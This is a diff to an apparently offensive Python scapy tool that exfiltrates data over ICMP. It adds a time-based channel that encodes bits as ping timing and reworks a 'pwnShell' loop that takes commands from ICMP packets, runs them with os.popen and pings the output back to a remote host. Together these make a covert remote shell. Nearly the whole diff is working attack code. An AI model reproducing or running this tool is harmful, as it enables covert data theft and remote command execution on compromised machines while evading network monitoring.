@@ -1,5 +1,6 @@
+import os, sys, base64, argparse
+from time import sleep
 from scapy.all import *
-import sys, base64, argparse, os
 
 def raw(p):
     return p[ICMP][Raw].load[16:32]
@@ -77,6 +78,29 @@ def exfiltrateLastBytes(data, ip, src, verbose):
     if verbose:
         print "[*] Message sent to {}".format(ip)
 
+def exfiltrateTimeBased(data, ip, src, verbose):
+
+    seq = bin(int((data).encode("hex"), 16))
+
+    if verbose:
+        print "[*] Destination of data: {}".format(ip)
+        if src:
+            print "[*] Sending encoded file: {}".format(src)
+        else:
+            print "[*] Sending encoded message: \"{}\"".format(data)
+
+    for i in seq[2:]:
+        sleep(.1)
+        if int(i):
+            os.system("ping -c1 {} > /dev/null".format(ip))
+        else:
+            sleep(.1)
+
+    os.system("ping -c1 -p {} {} > /dev/null".format("0a", ip))
+
+    if verbose:
+        print "[*] Message sent to {}".format(ip)
+
 def server(interface, mode):
 
     received = []
@@ -96,19 +120,27 @@ def server(interface, mode):
 
 def pwnShell(interface, mode, ip, receiver):
 
+    verbose = 0
+
     while True:
         if receiver:
-            data = ""
-            while data == "":
-                data = server(interface, mode)
+            data = server(interface, mode)
             cmd = os.popen(data).read()
-            exfiltrateLastBytes(cmd, ip, "", 0)
+            if mode == 1:
+                exfiltrateLastBytes(cmd, ip, "", verbose)
+            elif mode == 2:
+                exfiltrateTimeBased(cmd, ip, "", verbose)
+            else:
+                return
         else:
             cmd = raw_input("> ")
-            exfiltrateLastBytes(cmd, ip, "", 0)
-            data = ""
-            while data == "":
-                data = server(interface, mode)
+            if mode == 1:
+                exfiltrateLastBytes(cmd, ip, "", verbose)
+            elif mode == 2:
+                exfiltrateTimeBased(cmd, ip, "", verbose)
+            else:
+                return
+            data = server(interface, mode)
             print data.strip()
 
 if __name__ == "__main__":
@@ -117,6 +149,7 @@ if __name__ == "__main__":
     parser.add_argument('-o', '--out', type=str, help='write received data on a file')
     parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
     parser.add_argument('-H', '--host', type=str, help='the destination of the packets (ex: 127.0.0.1)')
+    parser.add_argument('-s', '--shell', help='use shell option', required=True, action='store_true')
 
     requiredNamed = parser.add_argument_group('required named arguments')
     parser.add_argument('-i', '--interface', type=str, help='interface to listen on', required=True)
@@ -126,9 +159,7 @@ if __name__ == "__main__":
     print "[*] Started listener on interface: {}".format(args.interface)
     print "[*] Listening mode: {}".format(args.mode)
 
-    shell = True
-
-    if shell:
+    if args.shell:
         pwnShell(args.interface, args.mode, args.host, 1)
 
     else:
